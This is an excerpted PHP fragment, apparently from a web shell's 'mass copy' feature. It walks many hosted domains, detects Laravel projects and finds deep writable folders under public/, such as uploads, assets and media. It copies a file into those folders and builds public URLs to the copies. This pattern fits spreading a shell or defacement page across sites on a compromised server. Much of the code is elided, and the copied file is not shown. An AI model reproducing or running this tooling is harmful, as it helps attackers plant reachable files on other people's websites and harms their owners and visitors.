...
function geckoMassIsLaravelApp($dir)
{
    ...
    // Laravel project root: must have public/ + (.env OR artisan)
...
function geckoMassLaravelPublicDir($dir)
{
    ...
    // Docroot may be a sibling path; climb 1 level if parent looks like Laravel
    $parent = dirname($dir);
...
/**
 * Keep only paths strictly under $root (Laravel public/). Drop storage/app/vendor/etc.
 */
...
/**
 * Laravel-only: find deep writable dirs inside public/. Never leave public/.
 * Prefers farthest (deepest) dirs; falls back to shallower / public itself.
 */
function geckoMassFindWritableInLaravelPublic($publicDir, $limit = 12)
{
    ...
    // Prefer deep dirs inside public/ (uploads, assets, media, …)
    $deep = geckoMassFindWritableDirs($publicDir, $limit, 1, 14);
    $deep = geckoMassFilterUnderRoot($deep, $publicDir);

    if (!empty($deep)) {
        return $deep;
    }

    // Fallback: any writable under public (incl. public itself)
    $shallow = geckoMassFindWritableDirs($publicDir, $limit, 0, 6);
    $shallow = geckoMassFilterUnderRoot($shallow, $publicDir);
    if (!empty($shallow)) {
        return $shallow;
    }

    if (@is_writable($publicDir)) {
        return array($publicDir);
    }
    return array();
}
...
/**
 * Resolve copy scan root for Mass Copy v1/v2/v3.
 * Laravel (.env + public/) → always start from public/ so URLs omit /public/.
 */
...
function geckoMassBuildUrl($scheme, $domainName, $domainDir, $dest)
{
    ...
    // Prefer stripping known web-root segment (public_html, public, …)
    foreach (geckoMassWebRoots() as $wr) {
        $prefix = $domainDir . '/' . $wr . '/';
    ...
    // When $domainDir is already Laravel public/ (or any web root), strip it
    if ($domainDir !== '' && strpos($dest, $domainDir . '/') === 0) {
        $rel = ltrim(substr($dest, strlen($domainDir)), '/');
        return $scheme . '://' . $domainName . '/' . $rel;
    }
    // Fallback: if dest is under …/public/ of a Laravel tree, never emit /public/ in URL
...
function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 0, $offset = 0, $v3 = false, $mode = '')
{
    ...
    foreach ($targets as $target) {
        ...
        // v1/v2/v3: Laravel (.env/.artisan + public/) → ONLY scan inside public/
        // Ignore storage/app/vendor/bootstrap/etc. Prefer deep writable dirs under public/.
        $laravelPublic = geckoMassLaravelPublicDir($domainDir);
        $isLaravel = ($laravelPublic !== '');
        $webRoot = $isLaravel ? $laravelPublic : geckoMassResolveCopyWebRoot($domainDir, $mode);
        $urlRoot = $webRoot;
        if ($isLaravel) {
        ...
        if ($isLaravel) {
            $candidates = geckoMassFindWritableInLaravelPublic($webRoot, ($mode === 'v2') ? 6 : 12);
            foreach ($candidates as $c) {
                $log('    laravel cand: ' . $c);
            }
            // Hard filter: never allow paths outside public/
        ...
        if (empty($candidates)) {
            $log('  SKIP: no writable' . ($isLaravel ? ' under public/' : ''));
            $skipped++;
            continue;
        }
        ...
        foreach ($candidates as $targetDir) {
            // Laravel safety: refuse any paste outside public/
            if ($isLaravel) {
                $td = rtrim(str_replace('\\', '/', (string)$targetDir), '/');
                $pr = rtrim($webRoot, '/');
                if ($td !== $pr && strpos($td, $pr . '/') !== 0) {
                    $log('    SKIP outside public/: ' . $targetDir);
                    continue;
                }
            }
